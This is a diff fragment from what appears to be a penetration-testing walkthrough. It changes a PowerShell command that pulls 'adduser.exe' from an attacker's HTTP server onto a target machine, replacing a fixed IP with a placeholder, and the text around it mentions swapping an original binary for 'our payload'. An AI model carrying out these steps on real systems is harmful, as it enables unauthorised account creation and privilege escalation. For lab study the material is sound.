@@ -40,7 +40,7 @@ python3 -m http.server 80
 ```
 On the target machine grab the binary:
 ```powershell
-iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
+iwr -uri http://<our IP>/adduser.exe -Outfile adduser.exe
 ```
 Move the original binary to a safe place, and replace it with our payload:
 ```powershell
